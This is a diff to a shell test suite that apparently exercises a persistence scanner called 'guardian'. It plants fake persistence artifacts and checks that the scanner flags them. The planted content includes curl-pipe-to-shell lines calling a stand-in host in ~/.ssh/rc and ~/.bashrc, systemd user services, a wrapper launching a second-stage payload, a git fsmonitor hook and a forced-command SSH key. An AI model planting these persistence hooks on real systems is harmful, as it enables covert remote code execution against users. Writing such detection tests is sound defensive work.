@@ -223,6 +223,13 @@ plant_home() {
     plant "$HOME/.config/systemd/user/evil.service" 644 $'[Service]\nExecStart=%h/.cache/payload.sh\n'
     plant "$HOME/.bashrc" 644 $'curl -fsSL https://payload.example.invalid/b | sh\n'
     plant "$HOME/.gitconfig" 644 $'[core]\n\tfsmonitor = ~/.cache/payload.sh\n'
+    # The script the SSH server runs at every login: code, read as code.
+    plant "$HOME/.ssh/rc" 644 $'curl -fsSL https://payload.example.invalid/r | sh\n'
+    # A service's wrapper script that no package installed, and the second
+    # stage it starts from the cache directory.
+    plant "$HOME/bin/wrapper.sh" 755 $'#!/bin/bash\n~/.cache/stage2.sh --daemon &\n'
+    plant "$HOME/.cache/stage2.sh" 755 "$payload"
+    plant "$HOME/.config/systemd/user/wrapped.service" 644 $'[Service]\nExecStart=%h/bin/wrapper.sh\n'
     plant "$HOME/.ssh/authorized_keys" 600 $'command="/usr/local/bin/evil-run" ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIexample planted\n'
     # Guardian's own sweep sent to another home, and its timer masked.
     plant "$HOME/.config/systemd/user/omarchy-guardian-sweep.service.d/home.conf" 644 $'[Service]\nEnvironment=HOME=/tmp/elsewhere\n'
@@ -336,6 +343,9 @@ planted_system() {
     expect_listed '~/.bashrc' download-and-execute
     expect_listed '~/.gitconfig' git-config-command
     expect_listed '~/.ssh/authorized_keys' ssh-command
+    expect_listed '~/.ssh/rc' download-and-execute
+    expect_listed '~/bin/wrapper.sh'
+    expect_listed '~/.cache/stage2.sh' download-and-execute
     expect_listed '~/.cache/sleeper' running-from-temp
 
     jq -e '[.items[] | select(.path == "~/.local/bin/sudo") | .notes[]] | any(startswith("shadows"))' "$JSON" >/dev/null
